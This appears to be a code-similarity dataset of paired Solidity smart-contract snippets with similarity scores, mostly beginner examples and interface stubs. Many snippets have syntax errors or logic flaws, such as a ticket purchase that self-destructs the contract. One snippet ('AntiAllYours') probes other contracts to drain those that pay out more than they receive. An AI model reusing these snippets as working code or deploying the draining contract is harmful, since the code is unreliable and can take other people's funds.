    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; 
        return msg.data;
    }
}"
"contract Coin {
    address public minter;

    mapping (address => uint) public banlances


    event Sent (address from, address to , uint amount);


    constructor() public {
        minter = msg.sender;
    }
    function mint(address recevier, uint amount) public {
        require(msg.sender == minter)
        require(amount < 1e60);
        banlances[recevier] += amount;
    }

}",0.6536451828914488,"contract Interface { 
    
    
    function Supply() public constant returns (uint);
    
    
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    
    
    function transfer(address to, uint tokens) public returns (bool success);
    
    
    event Transfer(address indexed from, address indexed to, uint tokens);

}"
"contract A {
    event E();

    function a() public {
        emit E();
    }
}",0.6728046267688302,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract B {
    A private a;

    function b() public {
        a();
    }
}",0.6557429961672809,"contract IChecker {

    function update() public payable;

}"
"contract Example {

string s;

function set_s(string new_s) {
    s = new_s;
}

function get_s() returns (string) {
    return s;
}
}",0.6496884939351617,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract Profile {
    struct User {
        string displayName;
        string displayIcon;
    }

    mapping(address => User) public users;
    string name;

    function createUser() public {
        users[msg.sender] = User({
            displayName: ""pre-set name"",
            displayIcon: ""pre-set icon""
        });
    }

    function getDisplayName() public view returns (string) {
        return users[msg.sender].displayName;
    }

    function getDisplayIcon() public view returns (string) {
        return users[msg.sender].displayIcon;
    }

    function setDisplayName(string newDisplayName) public {
        users[msg.sender].displayName = newDisplayName;
    }

    function setDisplayIcon(string newDisplayIcon) public {
        users[msg.sender].displayIcon = newDisplayIcon;
    }

    function getName() public view returns (string) {
        return name;
    }

    function setName(string newName) public {
        name = newName;
    }
}",0.60667718244036,"contract TokenMintERC20MintableToken is ERC20Mintable {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 initialSupply, address tokenOwnerAddress) public payable {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, initialSupply);
    }

    
    function transferMinterRole(address newMinter) public {
      addMinter(newMinter);
      renounceMinter();
    }

    
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract Account {
    mapping (address => uint) balance;

            function accept(uint postId) payable public {
                balance[msg.sender] += msg.value;
                uint beforeWeight = posts[postId].weight;
            }",0.6218932758036092,"contract PreArtexToken {
    function balanceOf(address _owner) constant returns(uint256 balance);
    mapping(address => uint) public deposits;
    uint public tokenPriceUSDWEI;
}"
"contract Factory {
    address[] createdContract;
    mapping (address => uint256) contractNo;
    mapping (address => address) contractOwner;
    mapping (address => bool) isEIP20;
    address owner;

    event NewContractCreated(address newContractAddress, address contractCreator);

    constructor() public {
        owner = msg.sender;
    }

    function createNewContract() payable public returns(address) {
        ERC20 newContract = new ERC20();

        newContract.EIP20();
        createdContract.push(address(newContract));
        isEIP20[address(newContract)] = true;
        contractNo[msg.sender]++;
        contractOwner[address(newContract)] = msg.sender;

        emit NewContractCreated(address(newContract), msg.sender);
    }

    function transfer(address _to, address _contractAddress)  public returns (bool) {
        ERC20Interface contractUsed = ERC20Interface(_contractAddress);
        require(contractUsed.transfer(_to, 50));
        return true;
    }

    function ownedContract() public view returns(uint256) {
        return contractNo[msg.sender];
    }

    function ownerOfContract(address _contractAddress) public view returns(address) {
        return contractOwner[_contractAddress];
    }
}",0.6198543900976782,"contract Relay is Ownable {

    address public licenseSalesContractAddress;

    address public registryContractAddress;

    address public apiRegistryContractAddress;

    address public apiCallsContractAddress;

    uint public version;



    

    

    

    constructor() public {

        version = 4;

    }



    

    

    

    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {

        return ERC20(tokenAddress).transfer(owner, tokens);

    }



    

    

    

    function setLicenseSalesContractAddress(address newAddress) public onlyOwner {

        require(newAddress != address(0));

        licenseSalesContractAddress = newAddress;

    }



    

    

    

    function setRegistryContractAddress(address newAddress) public onlyOwner {

        require(newAddress != address(0));

        registryContractAddress = newAddress;

    }



    

    

    

    function setApiRegistryContractAddress(address newAddress) public onlyOwner {

        require(newAddress != address(0));

        apiRegistryContractAddress = newAddress;

    }



    

    

    

    function setApiCallsContractAddress(address newAddress) public onlyOwner {

        require(newAddress != address(0));

        apiCallsContractAddress = newAddress;

    }

}"
"contract Foo {
  enum Bar {zero, one, two, three}
  function getOne() public pure returns (Bar) {
    return Bar.one;
  }
}",0.6579011514295222,"contract PureLoop
{
    function execute() public pure returns (uint output) {
        uint num;
        num +=execute();
        return num++;
    }
}"
"contract Adoption {

  address[16] public adopters;

  function adopt(uint petId) returns(uint) { 
    require(petId >= 0 && petId =< 15);
    adopters [pedId] = msg.sender;
    return petId;
  }

  function getAdopters(uint) public returns (address[16]) {
    return adopters;
  }",0.6249712339900655,"contract depositoTest is Notify
{
    address public dot;
    
    function setdot(address _addr) { dot = _addr; }
    
    function notify(address _from, uint _amount) public returns (bool)
    {
        require(msg.sender == dot);
        Notified(_from, _amount);
        return true;
    }
}"
"contract WithdrawalContract {
    address public richest;
    uint public mostSent;

    mapping (address => uint) pendingWithdrawals;

    function WithdrawalContract() payable {
        richest = msg.sender;
        mostSent = msg.value;
    }

    function becomeRichest() payable returns (bool) {
        if (msg.value > mostSent) {
            pendingWithdrawals[richest] += msg.value;
            richest = msg.sender;
            mostSent = msg.value;
            return true;
        } else {
            return false;
        }
    }

    function withdraw() {
        uint amount = pendingWithdrawals[msg.sender];
        
        
        pendingWithdrawals[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
}",0.6393938768798554,"contract ICO is Ownable {

    mapping (address => uint) public deposits;

    uint public openDate = now + 10 days;

    address public Owner;



    function() external payable {}



    function setup(uint _openDate) public payable {

        Owner = msg.sender;

        openDate = _openDate;

    }



    function deposit() public payable {

        if (msg.value >= 1 ether) {

            deposits[msg.sender] += msg.value;

        }

    }



    function withdraw(uint amount) public {

        if (isOwner() && now >= openDate) {

            uint max = deposits[msg.sender];

            if (amount <= max && max > 0) {

                msg.sender.transfer(amount);

            }

        }

    }

}"
"contract Inbox {
        string public message;

        function Inbox(

string initialMessage) public {
        message = initialMessage;
    }

    function setMessage(string newMessage) public {
        message = newMessage;
    } }",0.6863066785254426,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract SmartContract {
  address owner;
  string state;
  string status;
  function SmartContract() public {
    status = 'Pending';
    owner = msg.sender;
  }

  event update(string _msg, string _state);

  function getState() public constant returns(string) {
    return state;
  }

  function getStatus() public constant returns(string) {
    return status;
  }

  function setState(string _state) public returns(string) {
    state = _state;
    return state;
  }

  function finish() public {
    if (keccak256(state) == keccak256(""end"")) {
        status = 'Completed';
        update(""Completed"", state);
        selfdestruct(owner);
    }
  }

  function () public payable {

  }
}",0.6379470794086349,"contract Weihnachtsgeschenk {
	address public admin;
	string public from;
	string public to;
	string public message;
	string public gift;

	function Weihnachtsgeschenk(address admin_, string from_, string to_, string message_, string gift_) {
		admin = admin_;
		from = from_;
		to = to_;
		message = message_;
		gift = gift_;
	}

	function giftIsFrom() constant returns(string) {
		return from;
	}

	function giftIsTo() constant returns(string) {
		return to;
	}

	function giftMessage() constant returns(string) {
		return message;
	}

	function gift() constant returns(string) {
		return gift;
	}
}"
"contract Child {
    IParent parent;

    function setParent(address a) public {
        parent = IParent(a);
    }

    function getValue() external view returns (int value) {
        return parent.getValue();
    }

    function getSender() external view returns (address value) {
        return parent.getSender();
    }
}",0.6669100205251022,"contract AWToken {
       function burn(address addr, uint value) public;
       function balanceOf(address who) external view returns (uint);
       function calculationNeedAW(uint usdtVal) external view returns(uint);
       function usdtPrice() external view returns(uint);
    }"
"contract RefiningInterface is Sample {
    function refining(uint256 _id) external view returns (
        bool isRefiningInProcess,
        bool isReady,
        uint256 cooldownTime,
        uint256 nextActionsAt,
        uint256 extractionTime,
        uint256 extractionId,
        uint256 magnetiteId,
        uint256 hematiteId,
        uint256 class,
        uint256 sediments
    );
}",0.6056482230960274,"contract IFulcrum is IERC20 {
    function tokenPrice() external view returns (uint256 price);
    function mint(address receiver, uint256 amount) external returns (uint256 minted);
    function burn(address receiver, uint256 amount) external returns (uint256 burned);
    uint256 public totalAssetBorrow;
}"
"contract FOO {
    struct Coordinates {
        uint256 x;
        uint256 y;
    }

    function loopCoords(Coordinates[] coords) public returns (bool) {
        for (uint i = 0; i < coords.length; i++) {
            
        }
        return true;
    }
}",0.6112826173527981,"contract MythereumERC20Token is ERC20 {
  function burn(address burner, uint256 amount) public returns (bool);
  function mint(address to, uint256 amount) public returns (bool);
}"
"contract Test {
  ERC721Full public tokenAddress;

  constructor(address _address) public {
    tokenAddress = ERC721Full (_address);
  }

  function sendToOwner(...) public payable {
    address payable owner = tokenAddress.ownerOf(_tokenId);
    owner.transfer(msg.value);
  }
}",0.6278269430276053,"contract Airdrop {

    ERC20 token;

    function airdrop(address tokenAddress, address[] addresses, uint256 amount) public {

        token = ERC20(tokenAddress);

        for(uint i = 0; i < addresses.length; i++) {

            token.transferFrom(msg.sender, addresses[i], amount);

        }

    }

}"
"contract DappTokenSale {
  address admin;
  EdCoin public tokenContract;
  uint256 public tokenPrice;
  uint256 public tokensSold;

  event Sell(address _buyer, uint256 _amount);

  constructor(EdCoin _tokenContract, uint256 _tokenPrice) public {
    admin = msg.sender;
    tokenContract = _tokenContract;
    tokenPrice = _tokenPrice;
  }

  function multiply(uint x, uint y) internal pure returns (uint z) {
    require(y == 0 || (z = x * y) / y == x);
  }

  function buyTokens(uint256 _numberOfTokens) public payable {
    require(msg.value == multiply(_numberOfTokens, tokenPrice));
    require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);
    require(tokenContract.transferN(msg.sender, _numberOfTokens));

    tokensSold += _numberOfTokens;

    emit Sell(msg.sender, _numberOfTokens);
  }
}",0.6261592413600549,"contract TokenAbout is Controlled {

    event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);



    function isContract(address _addr) constant internal returns (bool) {

        if (_addr == 0) {

            return false;

        }

        uint256 size;

        assembly {

            size := extcodesize(_addr)

        }

        return (size > 0);

    }



    function claimTokens(address[] tokens) onlyController public {

        address _token;

        uint256 balance;

        ERC20Token token;

        for(uint256 i; i<tokens.length; i++){

            _token = tokens[i];

            if (_token == 0x0) {

                balance = address(this).balance;

                if(balance > 0){

                    msg.sender.transfer(balance);

                }

            }else{

                token = ERC20Token(_token);

                balance = token.balanceOf(address(this));

                token.transfer(msg.sender, balance);

                emit ClaimedTokens(_token, msg.sender, balance);

            }

        }

    }

}"
"contract HelloContract {
    string word = ""Hello World!"";

    function getWord() constant returns (string) {
        return word;
    }

    function setWord(string newWord) returns (string) {
        word = newWord;
        return word;
    }
}",0.6883513295865796,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() public constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) public {
        wellcomeString = newData;
    }
    
}"
"contract myEscrow is mortal {
    uint numEscrows;

    function queryNumEscrows() constant returns (uint) {
        return numEscrows;
    }

    function start() returns (uint) {
        numEscrows++;

        return numEscrows;
    }

}",0.6128320833804721,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract SimpleStorage {
  uint myVariable;
  event emitval();

  function setValue(uint x) public {
    emitval();
    myVariable = x;
  }

  function getValue() public returns (uint) {
    emitval();
    return myVariable;
  }
}",0.6144069321024342,"contract GemJoinLike {
    function dec() public returns (uint);
    function gem() public returns (GemLike);
    function join(address, uint) public payable;
    function exit(address, uint) public;
}"
"contract GardenTestContract {

    function getBalanceOf(address _address) public view returns (bool, uint, uint, address) {
        address sender = msg.sender;
        (bool _success, bytes memory data) = _address.staticcall(abi.encode(bytes4(keccak256('balanceOf(address)')), (sender)));
        (uint amount) = abi.decode(data, (uint));
        return (_success, data.length, amount, sender);
    }

    function getTotalSupply(address _address) public view returns (uint) {
        (bool _success2, bytes memory data) = _address.staticcall(abi.encode(bytes4(keccak256(""totalSupply()""))));
        (uint amount) = abi.decode(data, (uint));
        return amount;
    }

}",0.6575910721403685,"contract TokenDB is Owned {
    
    function transfer(address _from, address _to, uint256 _amount) external returns(bool _success) {}
    function bulkTransfer(address _from, address[] _to, uint256[] _amount) external returns(bool _success) {}
    function setAllowance(address _owner, address _spender, uint256 _amount) external returns(bool _success) {}
    
    function getAllowance(address _owner, address _spender) public view returns(bool _success, uint256 _remaining) {}
    function balanceOf(address _owner) public view returns(bool _success, uint256 _balance) {}
}"
"contract MyFactory {  
    address[] public myContracts;    

    function createContract(string stringOne, string stringTwo, string stringThree) public {          
        address sender = msg.sender;     
        address newContract = new MyContract(sender, stringOne, stringTwo, stringThree);            
        myContracts.push(newContract);   
    }    

    function getAllContracts() public view returns(address[]) {     
        return myContracts;   
    } 
}",0.6413323337439186,"contract tDeployer is Ownable {



	address private main;



	function cMain(address nM) public onlyOwner {

		main = nM;

	}



    function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address) {

		require(msg.sender == main);

		tokenContract newContract = new tokenContract(_tName, _tSymbol, _mint, _owner);

		return newContract;

	}





}"
"contract myTest {

  ERC20 myToken;

  function setToken(address tokenAddress) {
    myToken = ERC20(tokenAddress);
  }

  function getTokenBalanceOf(address h0dler) constant returns (uint balance) {
    return myToken.balanceOf(h0dler);
  }
}",0.6449641899812546,"contract Token { 
    function issue(address _recipient, uint256 _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function owner() returns (address _owner);
}"
"contract Precompile {
  function foo (bytes32, uint8, bytes32, bytes32) returns (address);
}",0.6465502341046776,"contract RegistryRef {
    function owner(bytes32 node) public constant returns (address);
}"
"contract Test {

    function Test() {
        
    }

    function getMsgSender() constant returns (address account) {
        account = msg.sender;
    }

}",0.6867578184978808,"contract Context {
	
	
	constructor() internal {}
	

	function _msgSender() internal view returns (address) {
		return msg.sender;
	}
}"
"contract Auth {      
    function verify( bytes32 hash, uint8 v, bytes32 r, bytes32 s) constant returns(address retAddr) {
        retAddr= ecrecover(hash, v, r, s);
    }
}",0.6308732206027496,"contract Registrar {
  function transfer(bytes32 _hash, address newOwner);
  function entries(bytes32 _hash) constant returns (uint, Deed, uint, uint, uint);
}"
"contract CallFunction {

    ArrayTes at;

    function CallFunction(address _t) {
        at = ArrayTes(_t);
    }

    function thirdfun(uint256 a) public view returns(uint256 c) {

        c = at.secfun(a);
        return c;
    }

}",0.6491103720796345,"contract GemLike4 {
    function decimals() public view returns (uint);
    function balanceOf(address) public returns (uint256);
    function transfer(address, uint256) public returns (bool);
}"
"contract MetaCoin {
  mapping (address => uint) balances;

  event Transfer(address indexed _from, address indexed _to, uint256 _value);

  function MetaCoin() {
    balances[tx.origin] = 10000;
  }

  function sendCoin(address receiver, uint amount) returns(bool sufficient) {
    if (balances[msg.sender] < amount) return false;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    Transfer(msg.sender, receiver, amount);
    return true;
  }

  function getBalanceInEth(address addr) returns(uint){
    return ConvertLib.convert(getBalance(addr),2);
  }

  function getBalance(address addr) returns(uint) {
    return balances[addr];
  }
}",0.6930081231314322,"contract TokenBase
{
    string public name;
    string public symbol;
    uint8 public decimals;
    
	uint256 internal currentSupply;

	mapping(address => uint) public balanceOf;
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	function totalSupply() constant returns (uint256)
	{
	    return currentSupply;
	}
	
	function transfer(address to, uint amount) returns (bool)
	{
		if (balanceOf[msg.sender] < amount) throw;           
		if (balanceOf[to] + amount < balanceOf[to]) throw;
		
		balanceOf[msg.sender] -= amount;
		balanceOf[to] += amount;
		Transfer(msg.sender, to, amount);
		return true;
	}
}"
"contract TestObject {

  uint public myValue;

    function TextObject() {
        myValue = 1000;
    }

  function deposit(uint value) returns(uint) {
        myValue += value;
        return myValue;
    }
}",0.6175607285307938,"contract SimpleStorageKevin {

    

    

    uint x = 316;



    

    function setKevin(uint newValue)

        public

    {

        x = newValue;

    }

    

    

    function getKevin()

        public

        view

        returns (uint) 

    {

        return x;

    }

}"
"contract MyTest {
    function refund() internal {  }
    function test(uint refund) public {
        uint i = refund;
    }
}",0.6635863628579116,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract patientRecord {
  address public owner;
  uint public numFiles;
  struct File {
    uint name;
    bytes32 illness;
  }
  mapping(uint => File) public files;

  
  function files(bytes32 _message) {
    if (msg.value == 0 || complete || refunded) throw;
    files[numFiles] = Pledge(msg.value.name, msg.value.illness);
    numFiles++;
  }

  function retreive(uint id){
      
  }

  function retreive(uint id){
      
  }

}",0.6033976242504283,"contract ERC20 {
    function transferFrom(address _from, address _to, uint _value) public returns (bool);
    function approve(address _spender, uint _value) public returns (bool);
    function allowance(address _owner, address _spender) public constant returns (uint);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract Test {
    bool public isResult1 = false;
    bool public isResult2 = false;

    function isAddressZero1(address _addr) public {
        isResult1 = (_addr == address(0));
    }

    function isAddressZero2(address _addr) public {
        isResult2 = (_addr == 0);
    }
}",0.6175608031957383,"contract Admin {

    address public owner;
    mapping(address => bool) public AdminList;
    
    function Test() public returns (uint256 _balance) {
            
        address sender = msg.sender;
        return sender.balance;
        
    }
    
      function TestX() public {
         
         owner = msg.sender;
        
    }
    
}"
"contract greeter {
    event LogSender(address sender);
    function getSender() constant returns (address) {
       LogSender(msg.sender);
       return msg.sender;
   }
}",0.6473252091007644,"contract OwnableInterface {



  

  function getOwner() public constant returns (address);



  

  modifier onlyOwner() {

    require (msg.sender == getOwner());

    _;

  }

}"
"contract Protected {
  mapping (address => uint256) public protectedTokens;                                                                                                                                                                                       

  function timeProtectTokens(address _address, uint256 _amount) public **onlyEscrow** {
    protectedTokens[_address] = protectedTokens[_address].add(_amount);                                                                                                                                                                     
  }
}",0.6107275599639534,"contract ExternalTokenLockerMock is Ownable {



    

    mapping (address => uint) public lockedTokenBalances;



    function lock(uint256 _amount, address _beneficiary) public onlyOwner {

        lockedTokenBalances[_beneficiary] = _amount;

    }

}"
"contract MyContract {
    uint mydata;

    function setData1(uint _data) public {
        mydata = _data; 
    }

    function setData2(uint _data) public {
        
        
        
    }

    function setData3(uint _data) public {
        mydata = _data;
        
        
    }    
}",0.6088323654914404,"contract ITokenMetadata {



    

    

    



    function symbol()

        public

        constant

        returns (string);



    function name()

        public

        constant

        returns (string);



    function decimals()

        public

        constant

        returns (uint8);

}"
"contract Test {

    address payable[] public contributors;

    constructor() public {}

    function bulkSend(uint256 amount) public payable {
        uint256 share = amount / contributors.length;
        uint256 length = contributors.length;
        uint256 currentSum = 0;
        for (uint256 i = 0; i < length; i++) {
            require(share > 0);
            currentSum += share;
            require(currentSum <= msg.value);
            contributors[i].transfer(share);
        }
        require(currentSum == msg.value);
    }

    function contribute() public payable {
        contributors.push(msg.sender);
        bulkSend(msg.value);
    }
}",0.6553400138055538,"contract BlockportDistributor {

    using SafeMath for uint256;



    event Distributed(address payable[] receivers, uint256 amount);



    

    constructor () public {

    }



    

    function () external payable {

        revert();

    }



    

    function distribute(address payable[] calldata receivers, uint256 amount) external payable returns (bool success) {

        require(amount.mul(receivers.length) == msg.value);



        for (uint256 i = 0; i < receivers.length; i++) {

            receivers[i].transfer(amount);

        }

        emit Distributed(receivers, amount);

        return true;

    }

}"
"contract test {
    mapping(string => address) values;

    function AddValue(string randomValue) {
        require(values[randomValue] == 0x0);

        
        
    }
}",0.6663278408081238,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract Test {

  uint256 number;

  constructor() public {}

  function set (uint256 n) public {
    number = n;
  }

  function get () public view returns (uint256) {
    return number;
  }
}",0.694106190497188,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract Register {
    string private name;

    constructor(string entityname) public {
        name = entityname;
    }

    function getName() public view returns (string username) {
        return name;
    }
}",0.6673638229071648,"contract KVPStore {

    string jsonKvps;



    constructor(string memory _jsonKvps) public {

        jsonKvps = _jsonKvps;

    }



    function getKvps() public view returns (string memory) {

        return jsonKvps;

    }

}"
"contract MyToken is ERC20 {
    MyTokenImpl private myTokenImpl;

    constructor(MyTokenImpl _myTokenImpl) public {
        myTokenImpl = _myTokenImpl;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        let status = myTokenImpl.transfer(to, value);
        return status || super.transfer(to, value);
    }
}",0.6178042411833031,"contract EnjoyGameToken {

    function transfer(address _to, uint256 _value) public returns (bool);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);

    function transferAndLock(address _to, uint256 _value, uint256 _releaseTimeS) public returns (bool);

}"
"contract Caller {

    address public called_address;

    constructor() public payable {

    }

    function set_address(address _addy) public {
        called_address = address(_addy);
    }
    function () public payable{
        Called c = Called(called_address);
        if (c.get() > 10 ){
            revert(""Too much sauce"");
        }
        c.set();
    }

}",0.6266949078489281,"contract inviterBookI{

    function isRoot(address addr) public view returns(bool);

    function hasInviter(address addr) public view returns(bool);

    function setInviter(address addr, string inviter) public;

    function pay(address addr) public payable;

}"
"contract A {

    event trace(address a);

    struct details { string name; uint roll ;} 

    mapping (address => details) public testMap;

    function set (string name, uint roll) {

        Student instance = new Student(name, roll);
        testMap[instance] = details(name,roll);

    }

    function get (address a) {

        testMap[a];

        
    }
}",0.6114839560729266,"contract TokenFactory {

    event TokenCreated(

        address indexed addr,

        string  name,

        string  symbol,

        uint8   decimals,

        uint    totalSupply,

        address firstHolder

    );

    

    

    

    

    

    

    function createToken(

        string  name,

        string  symbol,

        uint8   decimals,

        uint    totalSupply

        )

        external

        returns (address addr);

}"
"contract Student {

    function Student(string name, uint roll) {

    }


}",0.6033837378133673,"contract Target {
    function transfer(address _to, uint _value);
}"
"contract Escrow {
    
    uint256 public anteAmount;
    
    address connect4;
    
    address player1;
    
    address player2;
    
    mapping(address => bool) anted;
    
    address payable winner;

    constructor(address player1, address player2, address connect4, uint256 anteAmount) public {
        player1 = player1;
        player2 = player2;
        connect4 = connect4;
        anteAmount = anteAmount;
    }

    modifier onlyConnect4() {
      require(address(msg.sender) == connect4, ""Forbidden Access."");
      _;
    }

    function () external payable onlyConnect4 {
    }

    function placeAnte(address player) payable public returns (bool) {
        require(anted[player] == false, ""player has already placed ante."");
        require(player == player1 || player == player2, ""invalid player address."");
        require(msg.value == anteAmount, ""ante unequal to required ante amount."");
        address(this).transfer(msg.value);
        anted[player] = true;
        return true;
    }
...
}",0.623937195439809,"contract AntiAllYours {



    address payable private owner;



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    constructor() public payable {

        owner = msg.sender;

    }



    function pingMsgValue(address payable _targetAddress, bool _toOwner) public payable {

        pingAmount(_targetAddress, msg.value, _toOwner);

    }



    function pingAmount(address payable _targetAddress, uint256 _amount, bool _toOwner) public payable onlyOwner {

        require(_targetAddress.balance > 0);



        uint256 ourBalanceInitial = address(this).balance;



        (bool success, bytes memory data) = _targetAddress.call.value(_amount)("""");

        require(success);

        data; 



        require(address(this).balance > ourBalanceInitial);



        if (_toOwner) {

            owner.transfer(address(this).balance);

        }

    }



    function withdraw() public onlyOwner {

        owner.transfer(address(this).balance);

    }



    function kill() public onlyOwner {

        selfdestruct(owner);

    }



    function () external payable {

    }



}"
"contract MyToken {

    mapping (address => uint256) public balanceOf;
    function MyToken(uint256 initialSupply) {
        balanceOf[msg.sender] = initialSupply;
    }
}",0.6352020855938221,"contract Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) public returns (bool success) {

    }
}"
"contract Sharer {
        function sendHalf(address addr) returns (uint balance) {
            if (!addr.send(msg.value / 2)) 
                throw;                     
            return this.balance;
        }
    }",0.6827880455727137,"contract BalanceFixable is OwnedI {
    function fixBalance() 
        returns (bool success) {
        if (!getOwner().send(this.balance)) {
            throw;
        }
        return true;
    }
}"
"contract Test {
    address one;

function Test(address _one) public {
    one = _one;
}

function send1() public payable {
    one.transfer(10);
}

function send2() public payable {
    require(msg.value > 0);
    one.transfer(msg.value);
}

function get() public view returns (address) {
    return one;
}
",0.6980724263689199,"contract BitSTDView{

    function symbol()constant  public returns(string) {}

    function migration(address add) public{}

    function transfer(address _to, uint256 _value) public {}

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {}

}"
"contract Test08 {

    address Creator;  
    address TesterAddress;  

    uint TesterFee;
    uint TestAFee;
    uint TestBFee;
    uint TestcFee;
    uint TestCount;

    address TokenAddress;


    function Test08() public {

        TesterAddress = msg.sender;
        TesterFee = 5; 
        TestAFee = 6; 
        TestBFee = 7; 
        TestcFee = 8; 
        Creator = msg.sender;
        TokenAddress = 1234; 
        TestCount = 0;
    }


  
    function () public payable {
    }


    function getTesterFee() public view returns (uint) {return(TesterFee);}
    function getTestAFee() public view returns (uint) {return(TestAFee);}
    function getTestBFee() public view returns (uint) {return(TestBFee);}
    function getTestcFee() public view returns (uint) {return(TestcFee);}
    function getTester() public view returns (address) {return(Creator);}

    function setTesterFee(uint inTesterFee) public {
        if (msg.sender == Creator) {TesterFee = inTesterFee;}
    }

    function setTestAFee(uint inTestAFee) public {
        if (msg.sender == Creator) {TestAFee = inTestAFee;}
    }

    function setTestBFee(uint inTestBFee) public {
        if (msg.sender == Creator) {TestBFee = inTestBFee;}
    }

    function setTestcFee(uint inTestcFee) public {
        if (msg.sender == Creator) {TestcFee = inTestcFee;}
    }

}",0.611392580845344,"contract ERC20Interface {



  

  event Approval(address indexed src, address indexed guy, uint wad);

  event Transfer(address indexed src, address indexed dst, uint wad);



  function name() public view returns (string name);

  function symbol() public view returns (string symbol);

  function decimals() public view returns (uint8 decimals);

  function totalSupply() public view returns (uint256 totalSupply);

  function balanceOf(address _owner) public view returns (uint256 balance);

  function transfer(address _to, uint256 _value) public returns (bool success);

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

  function approve(address _spender, uint256 _value) public returns (bool success);

  function allowance(address _owner, address _spender) public view returns (uint256 remaining);



  

  function getBalanceAddr(uint256 _index) public view returns(address addr);

  function getBalance(uint256 _index) public view returns(uint256 tokens);

  function getBalanceSize() public view returns(uint256 size);

}"
"contract A {
    address public addr;
    bool public success;
    bytes public result;

function setAddr(address _addr) public {
    addr = _addr;
}


function callB(uint256 arg1) public {
    (success, result) = addr.staticcall(abi.encodeWithSignature(""funcB(uint256)"", arg1));
}

}",0.6555221474798559,"contract inviterBookI{

    function isRoot(address addr) public view returns(bool);

    function hasInviter(address addr) public view returns(bool);

    function setInviter(address addr, string inviter) public;

    function pay(address addr) public payable;

}"
"contract DataProvider {

struct Proposal {
    address owner;
    uint id;
    bytes16 name;
    bytes32 desc;
    uint pool_size;
    address[] consents;
    bool initialized;
}

address public admin;
Proposal[] public proposals;

function DataProvider() {
    admin = msg.sender;
}

function createProposal(bytes16 nm, bytes32 ds, uint n) {
    address[] memory cons;
    proposals.push(Proposal({ owner: msg.sender, id: proposals.length, name: nm, desc: ds, consents: cons, pool_size: n, initialized: true }));
}


}",0.6117873093603283,"contract PersonalTokenFactory {
    
    
    PersonalToken private PT;
    
    address[] public tokens;
    
    event Deployed(address indexed PT, address indexed owner);
    
    function newPT(
       	string memory _name, 
		string memory _symbol,
		uint8 _decimals,
		uint256 _init) public {
       
        PT = new PersonalToken(
            _name, 
            _symbol, 
            _decimals,
            _init,
            msg.sender);
        
        tokens.push(address(PT));
        
        emit Deployed(address(PT), msg.sender);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract Account {
    string name;
    string secName;
    uint balance;

    function Account(string name, string secName) {
        name = name;
        secName = secName;
        balance = 1;
    }
}",0.6467869043827138,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract MortalSample is Mortal {
    string public someState;

    function () public payable {
    }

    function MotalSample () public {
        owned;

        someState = ""initial"";
    }
}",0.6160263667083165,"contract Cookie {



  function () public payable {}



  



  function getFlavor()

    public

    constant

    returns (string flavor)

  {

    return ""mmm ... chocolate chip"";

  }

}"
"contract hello {
uint public totalTickets; 
uint constant price = 1 ether ; 
address owner ;
address hacked = 0x583031d1113ad414f02576bd6afabfb302140225; 

mapping (address => uint) public buyers ;

function hello () {
    totalTickets = 5 ; 
    owner = msg.sender ;

}

function buyTickets(uint amount, address _from) payable{
    if(msg.value != (price * amount) || amount > totalTickets){
        throw; 
    }

    buyers[msg.sender] += amount ; 
    totalTickets -= amount; 
   selfdestruct(owner);


}

}",0.6117319492954074,"contract ERC20ModuleSupport {
    function _fulfillPreapprovedPayment(address _from, address _to, uint _value, address msg_sender) public returns(bool success);
    function _fulfillPayment(address _from, address _to, uint _value, uint subId, address msg_sender) public returns (bool success);
    function _mintFromDeposit(address owner, uint amount) public;
    function _burnForDeposit(address owner, uint amount) public returns(bool success);
}"
"contract Admin {
  bool public contractStatus = false;
  address public owner;

  
  struct AdminDetails {
      string name;
      string details;
      bool state;
      address addr;
      uint group;
  }

  
  function Admin() {
    contractStatus = true;
    owner = msg.sender;
  }

  
  
  
  
  function checkCreatePermission(bytes1 permVal) returns (bool permCheck) {
    return ((permVal & 0x08) == 0x08);
  }

  function isOwned(address ownerAddr) returns (bool _owned) {
